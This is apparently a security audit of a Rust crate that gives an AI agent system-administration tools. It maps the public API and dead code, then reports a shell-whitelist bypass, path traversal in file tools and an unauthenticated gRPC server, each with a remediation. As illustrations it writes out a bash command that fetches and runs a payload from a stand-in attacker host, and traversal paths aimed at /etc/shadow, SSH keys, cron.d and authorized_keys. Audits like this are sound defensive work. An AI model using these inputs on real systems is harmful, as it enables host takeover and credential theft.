# Public API Surface & Dead Code Audit

## Public API Surface Enumeration

The total manual (non-generated) public API surface of the `op-chat` crate comprises **189 public items** (excluding the auto-generated protobuf models in `op_chat.orchestration.rs`, which collectively add over 300 additional public structs and enums).

### Top 10 Most Impactful Public Items

| Item Name | Type | file:line | Impact Description |
|:---|:---|:---|:---|
| `ChatActor` | `struct` | `crates/op-chat/src/actor.rs:271` | The central brain processing incoming RPC requests sequentially. |
| `ChatActorHandle` | `struct` | `crates/op-chat/src/actor.rs:177` | The public client handle used to send requests to the actor's event loop. |
| `ForcedToolPipeline` | `struct` | `crates/op-chat/src/forced_tool_pipeline.rs:59` | Anti-hallucination executor ensuring LLMs always call response/action tools. |
| `GrpcAgentPool` | `struct` | `crates/op-chat/src/orchestration/grpc_pool.rs:256` | Handles connection pooling, health checks, and circuit-breaking for system agents. |
| `OrchestratedExecutor` | `struct` | `crates/op-chat/src/orchestration/executor.rs:81` | Directs requests dynamically to workstacks, direct tools, or multi-agent coordinator. |
| `NLAdminOrchestrator` | `struct` | `crates/op-chat/src/nl_admin.rs:239` | Standard system administrator orchestrator translating user prompts to system tool calls. |
| `SessionManager` | `struct` | `crates/op-chat/src/session.rs:122` | Manages chat session history, credentials, and WireGuard peer mapping state. |
| `TrackedToolExecutor` | `struct` | `crates/op-chat/src/tool_executor.rs:98` | Controls tool execution rate limiting, accountability tracking, and concurrency limits. |
| `OrchestrationServer` | `struct` | `crates/op-chat/src/orchestration/services/mod.rs:114` | The unified gRPC server backing all system administration service interfaces. |
| `RpcRequest` | `enum` | `crates/op-chat/src/actor.rs:56` | Enumerates all public RPC methods for system control, D-Bus calls, and chat. |

---

### Glob Re-exports
* **None found.** No glob re-exports (`pub use *`) are present in any of the provided files. All re-exports in `crates/op-chat/src/lib.rs` and `crates/op-chat/src/orchestration/mod.rs` use explicit, fully-qualified brace imports (e.g., `pub use actor::{ChatActor, ...}`).

---

### Struct Public Fields That Should Be Private

#### 1. Public Sync State Maps exposed on `OrchestrationServer`
* **File & Line:** `crates/op-chat/src/orchestration/services/mod.rs:114`
* **Struct:** `OrchestrationServer`
* **Public Fields:**
  * `pub memory: Arc<RwLock<HashMap<String, MemoryEntry>>>`
  * `pub chains: Arc<RwLock<HashMap<String, ThinkingChain>>>`
  * `pub contexts: Arc<RwLock<HashMap<String, ContextEntry>>>`
  * `pub sessions: Arc<RwLock<HashMap<String, SessionInfo>>>`
  * `pub cancellation_tokens: Arc<RwLock<HashMap<String, tokio::sync::watch::Sender<bool>>>>`
* **Risk:** Exposing raw concurrent data structures publicly allows any caller with a server reference to lock maps indefinitely (denial of service), read/write raw unvalidated session state, or inject malicious/forged data directly.
* **Remediation:** Make these fields private. Expose access exclusively through well-defined, safe async methods that manage lock acquisition internally.

#### 2. Public Execution Logging on `OrchestratedResult`
* **File & Line:** `crates/op-chat/src/orchestration/executor.rs:36` (and `crates/op-chat/src/orchestrated_executor.rs:39`)
* **Struct:** `OrchestratedResult`
* **Public Fields:** `pub trace: Vec<TraceEntry>`
* **Risk:** Callers can modify the vector in-place, allowing tampering with the auditing/execution logs of operations.
* **Remediation:** Make `trace` private and expose a slice getter (`pub fn trace(&self) -> &[TraceEntry]`).

#### 3. Public Boxed Error on `OrchestrationError`
* **File & Line:** `crates/op-chat/src/orchestration/error.rs:135`
* **Struct:** `OrchestrationError`
* **Public Fields:** `pub source: Option<Box<dyn std::error::Error + Send + Sync>>`
* **Risk:** Allows downstream consumers to replace or modify the underlying root cause of the system error.
* **Remediation:** Make private and expose via the standard `std::error::Error::source` implementation.

---

## Dead Code Analysis

### `#[allow(dead_code)]` Attribute Occurrences

* `crates/op-chat/src/orchestration/coordinator.rs:43` — Allowed dead code on `priority: i32` field.
* `crates/op-chat/src/orchestration/coordinator.rs:63` — Allowed dead code on helper function `with_timeout`.
* `crates/op-chat/src/orchestration/coordinator.rs:69` — Allowed dead code on helper function `with_priority`.
* `crates/op-chat/src/orchestration/coordinator.rs:105` — Allowed dead code on the entire `CoordinatorMessage` enum definition.
* `crates/op-chat/src/orchestration/coordinator.rs:125` — Allowed dead code on struct field `pending_tasks`.
* `crates/op-chat/src/orchestration/coordinator.rs:127` — Allowed dead code on struct field `active_tasks`.
* `crates/op-chat/src/orchestration/coordinator.rs:129` — Allowed dead code on struct field `results`.
* `crates/op-chat/src/orchestration/coordinator.rs:131` — Allowed dead code on struct field `tx`.
* `crates/op-chat/src/orchestration/coordinator.rs:133` — Allowed dead code on struct field `rx`.
* `crates/op-chat/src/orchestration/coordinator.rs:314` — Allowed dead code on statistics getter `stats`.
* `crates/op-chat/src/orchestration/coordinator.rs:334` — Allowed dead code on `CoordinatorStats` struct definition.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:56` — Allowed dead code on enum variant `Never`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:60` — Allowed dead code on enum variant `OnFailure`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:62` — Allowed dead code on enum variant `UnlessStopped`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:77` — Allowed dead code on status field `dbus_name`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:79` — Allowed dead code on status field `pid`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:85` — Allowed dead code on status field `last_health_check`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:101` — Allowed dead code on enum variant `Starting`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:105` — Allowed dead code on enum variant `Stopping`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:109` — Allowed dead code on enum variant `Failed`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:116` — Allowed dead code on enum variant `Unhealthy`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:118` — Allowed dead code on enum variant `Unknown`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:120` — Allowed dead code on enum variant `Degraded`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:128` — Allowed dead code on struct field `config`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:161` — Allowed dead code on helper method `disconnect`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:174` — Allowed dead code on method `spawn_agent`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:206` — Allowed dead code on method `stop_agent`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:222` — Allowed dead code on method `restart_agent`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:247` — Allowed dead code on method `get_agent_status`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:253` — Allowed dead code on method `list_agents`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:259` — Allowed dead code on method `list_agents_by_type`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:272` — Allowed dead code on method `health_check`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:284` — Allowed dead code on method `send_to_agent`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:314` — Allowed dead code on method `broadcast`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:355` — Allowed dead code on status query `stats`.
* `crates/op-chat/src/orchestration/dbus_orchestrator.rs:375` — Allowed dead code on `OrchestratorStats` struct definition.
* `crates/op-chat/src/nl_admin.rs:434` — Allowed dead code on helper `format_value`.
* `crates/op-chat/src/orchestration/executor.rs:27` — Allowed dead code on enum variant `Skill`.
* `crates/op-chat/src/orchestration/executor.rs:104` — Allowed dead code on struct field `tracker`.
* `crates/op-chat/src/orchestration/executor.rs:114` — Allowed dead code on method `execute`.
* `crates/op-chat/src/orchestration/skills.rs:278` — Allowed dead code on helper `combined_context`.
* `crates/op-chat/src/orchestration/workflows.rs:16` — Allowed dead code on struct field `description`.
* `crates/op-chat/src/orchestration/workflows.rs:19` — Allowed dead code on struct field `default`.
* `crates/op-chat/src/orchestration/workflows.rs:23` — Allowed dead code on struct field `required`.
* `crates/op-chat/src/orchestration/workflows.rs:32` — Allowed dead code on struct field `name`.
* `crates/op-chat/src/orchestration/workflows.rs:53` — Allowed dead code on struct field `timeout_secs`.
* `crates/op-chat/src/orchestration/workflows.rs:65` — Allowed dead code on struct field `description`.
* `crates/op-chat/src/orchestration/workflows.rs:70` — Allowed dead code on struct field `variables`.
* `crates/op-chat/src/orchestration/workflows.rs:76` — Allowed dead code on struct field `category`.
* `crates/op-chat/src/orchestration/workflows.rs:111` — Allowed dead code on struct field `current_step`.
* `crates/op-chat/src/orchestration/workflows.rs:252` — Allowed dead code on helper constructor `with_defaults`.
* `crates/op-chat/src/orchestration/workflows.rs:260` — Allowed dead code on query method `list`.
* `crates/op-chat/src/orchestration/workstacks.rs:23` — Allowed dead code on enum variant `RolledBack`.
* `crates/op-chat/src/orchestration/workstacks.rs:114` — Allowed dead code on builder method `with_skill`.
* `crates/op-chat/src/orchestration/workstacks.rs:120` — Allowed dead code on builder method `with_category`.
* `crates/op-chat/src/orchestration/workstacks.rs:200` — Allowed dead code on struct field `failed_phases`.
* `crates/op-chat/src/orchestration/workstacks.rs:203` — Allowed dead code on struct field `phase_results`.
* `crates/op-chat/src/orchestration/workstacks.rs:293` — Allowed dead code on list query `list`.
* `crates/op-chat/src/orchestration/workstacks.rs:299` — Allowed dead code on query `list_by_category`.

---

### Dead Code Table

| Item | Type | file:line | Recommendation |
|:---|:---|:---|:---|
| `HybridExecutor` | `struct` | `crates/op-chat/src/hybrid_executor.rs:48` | **Remove**. Bypassed entirely by the forced tool pipeline and never integrated into the crate's `lib.rs` exports. |
| `IntentExecutor` | `struct` | `crates/op-chat/src/intent_executor.rs:154` | **Remove**. Completely unreferenced in standard execution pipelines. |
| `ToolOrchestrator` | `struct` | `crates/op-chat/src/tool_orchestrator.rs:22` | **Remove**. Bypassed by `ForcedToolPipeline` and `TrackedToolExecutor`. |
| `ForcedToolChatLoop` | `struct` | `crates/op-chat/src/chat_loop.rs:47` | **Remove**. Bypassed by `ForcedToolPipeline`. |
| `OwnedValue` | `use` | `crates/op-chat/src/nl_admin.rs:11` | **Remove**. Unused import (imported directly alongside the alias `OwnedValue as Value`). |
| `OwnedValue` | `use` | `crates/op-chat/src/orchestration/grpc_pool.rs:12` | **Remove**. Unused import (aliased as `Value`). |
| `mpsc` | `use` | `crates/op-chat/src/orchestration/grpc_pool.rs:14` | **Remove**. Unused import. |
| `OwnedValue` | `use` | `crates/op-chat/src/orchestration/workstack_executor.rs:14` | **Remove**. Unused import (aliased as `Value`). |
| `Span` | `use` | `crates/op-chat/src/orchestration/workstack_executor.rs:17` | **Remove**. Unused import. |

---

## Production Security & Quality Audit

### CRITICAL: Argument-Passing Privilege Escalation in `ShellExecuteTool` Whitelist Check
* **File & Line:** `crates/op-chat/src/tool_loader.rs:418` (definition), `tool_loader.rs:423` (execute)
* **Vulnerability Type:** Remote Code Execution (RCE) / Security Gate Bypass
* **Description:** 
  The `ShellExecuteTool` attempts to restrict system command execution to a safe list of commands (such as `"cargo"`, `"python"`, `"bash"`, `"sh"`, `"docker"`, `"kubectl"`, `"systemctl"`). However, the whitelist check **only** validates the root command name (`input.get("command")`), completely ignoring the arguments passed via `args`.
  
  ```rust
  let command = input.get("command").and_then(|v| v.as_str())...
  if !self.allowed_commands.contains(&command.to_string()) {
      return Ok(json!({ "success": false, "error": ... }));
  }
  // ...
  let mut cmd = tokio::process::Command::new(command);
  cmd.args(&args);
  ```
  
  An attacker can bypass this restriction by passing a whitelisted shell binary like `"bash"` or `"sh"` and supplying arbitrary system payloads as arguments:
  * `command: "bash"`
  * `args: ["-c", "curl http://attacker.com/payload | sh"]`
  
  This grants full host shell execution with the privileges of the running daemon, completely rendering the whitelist security control useless.
* **Remediation:** Remove shell binaries (`"bash"`, `"sh"`, `"python"`, `"node"`, etc.) from `allowed_commands` completely. If raw shell access is needed, validate the full parsed command argument list against strict regular expressions, or drop this tool in favor of direct zbus/D-Bus systemd commands.

---

### CRITICAL: Path Traversal and Arbitrary File Read via `ReadFileTool`
* **File & Line:** `crates/op-chat/src/tool_loader.rs:237` (definition), `tool_loader.rs:253` (execute)
* **Vulnerability Type:** Path Traversal / Arbitrary File Read
* **Description:**
  `ReadFileTool` implements a hardcoded restriction on sensitive files, checking only if the path starts with `/etc/shadow` or `/etc/sudoers`.
  
  ```rust
  let forbidden_paths = ["/etc/shadow", "/etc/sudoers"];
  if forbidden_paths.iter().any(|&p| path.starts_with(p)) {
      return Ok(json!({ "success": false, "error": ... }));
  }
  match tokio::fs::read_to_string(path).await { ... }
  ```
  
  This check is critically vulnerable:
  1. **No Path Canonicalization:** The path is not normalized using `fs::canonicalize`. An attacker can read `/etc/shadow` using simple relative directory traversal paths like `/tmp/../etc/shadow` or `/etc/./shadow`.
  2. **Insufficient Scope:** An attacker can read any other sensitive file on the host filesystem that is not explicitly `/etc/shadow` or `/etc/sudoers` (e.g., users' private SSH keys via `/home/user/.ssh/id_rsa`, database configuration files, and application secrets).
* **Remediation:** Implement canonicalization before checking paths. Restrict the base directories of files being read to a specific safe, sandboxed location:
  ```rust
  let canonical_path = std::fs::canonicalize(path)?;
  if !canonical_path.starts_with("/var/safe/sandboxed/dir") {
      return Err(anyhow!("Access Denied"));
  }
  ```

---

### CRITICAL: Path Traversal and Host Takeover via `WriteFileTool`
* **File & Line:** `crates/op-chat/src/tool_loader.rs:294` (definition), `tool_loader.rs:321` (execute)
* **Vulnerability Type:** Path Traversal / Arbitrary File Write
* **Description:**
  Similar to the read tool, the `WriteFileTool` attempts to prevent writing to standard system configuration directories by checking path prefixes:
  
  ```rust
  let forbidden_prefixes = ["/etc/", "/boot/", "/sys/", "/proc/"];
  if forbidden_prefixes.iter().any(|&p| path.starts_with(p)) {
      return Ok(json!({ "success": false, "error": ... }));
  }
  ```
  
  Because the path is not canonicalized, an attacker can bypass the prefix filter by traversing directories (e.g., writing to `/tmp/../etc/cron.d/malicious_job` or `/tmp/../home/user/.ssh/authorized_keys`). This grants immediate host takeover.
* **Remediation:** Canonicalize paths and restrict writes to a strict write-sandbox directory using `canonical_path.starts_with(...)`.

---

### CRITICAL: Unauthenticated Remote gRPC Services with System-Level Capabilities
* **File & Line:** `crates/op-chat/src/orchestration/services/mod.rs:136`
* **Vulnerability Type:** Lack of Authentication and Authorization
* **Description:**
  The orchestration gRPC server is initialized and runs on an external socket address (`OP_CHAT_LISTEN`, which defaults to `0.0.0.0:50052`). The services exposed—including `AgentExecutionServer`, `AgentLifecycleServer`, and `WorkstackService`—allow triggering complex commands, spawning background agents, and running raw processes. No TLS, token authentication (like JWT), or access-control interceptors are registered on the tonic server builder. Anyone on the network can call these RPC methods to invoke tools or execute shell commands.
* **Remediation:** Add secure mutual TLS (mTLS) to the Tonic Server builder and integrate a gRPC interceptor to validate authorization tokens (e.g., Bearer tokens) on every incoming metadata request header.

---

### High Severity: Sequential Blocking Event Loop inside `ChatActor` (Denial of Service)
* **File & Line:** `crates/op-chat/src/actor.rs:356` (run loop), `actor.rs:360` (receive)
* **Vulnerability Type:** Denial of Service (DoS)
* **Description:**
  The `ChatActor` processes RPC messages sequentially on a single task:
  ```rust
  while let Some(msg) = self.receiver.recv().await {
      let response = self.handle_request(msg.request).await;
      let _ = msg.respond_to.send(response);
  }
  ```
  If `handle_request` executes a long-running, blocking, or slow operation (such as waiting for `handle_chat` to query an external LLM with a 300-second timeout), the entire actor event loop blocks. No other incoming message in the channel (including critical health checks, OVS network setups, or D-Bus cancel requests) can be processed until the current chat transaction completes. This allows an attacker to trivialize DoS of the entire control plane by keeping a single chat connection hanging.
* **Remediation:** Spawn concurrent requests inside the loop onto separate tokio tasks, while protecting critical shared structures with thread-safe mechanisms:
  ```rust
  while let Some(msg) = self.receiver.recv().await {
      let self_clone = self.clone(); // If ChatActor is cheap to clone/Arc-wrapped
      tokio::spawn(async move {
          let response = self_clone.handle_request(msg.request).await;
          let _ = msg.respond_to.send(response);
      });
  }
  ```

---

### Medium Severity: Lifetime/Soundness Hazards in Unsafe destructuring of `Value` during parsing
* **File & Line:** `crates/op-chat/src/forced_execution.rs:341` and `crates/op-chat/src/nl_admin.rs:166`
* **Vulnerability Type:** Code Smell / Potential Memory Corruption Hazard
* **Description:**
  The codebase uses raw unsafe blocks to call `simd_json::from_str`:
  
  ```rust
  unsafe { simd_json::from_str(&mut args.as_str().unwrap().to_string()) }
  ```
  
  `simd_json::from_str` is safe but expects a mutable reference (`&mut str`) because it performs destructive, in-place parsing. 
  Constructing a temporary mutable string inside an `unsafe` block without binding it to a local variable introduces an extremely fragile temporary lifetime. If the compiler frees the underlying buffer prematurely, this leads to undefined behavior. Furthermore, wrapping safe functions like `from_str` (which merely takes `&mut str`) inside an `unsafe` block bypasses safety documentation constraints and is a severe code quality hazard.
* **Remediation:** Bind the mutable string to a local variable before parsing, and avoid wrapping safe library operations in raw unsafe blocks:
  ```rust
  let mut args_string = args.as_str().unwrap().to_string();
  let arguments = simd_json::from_str::<Value>(&mut args_string)
      .unwrap_or_else(|_| Value::null());
  ```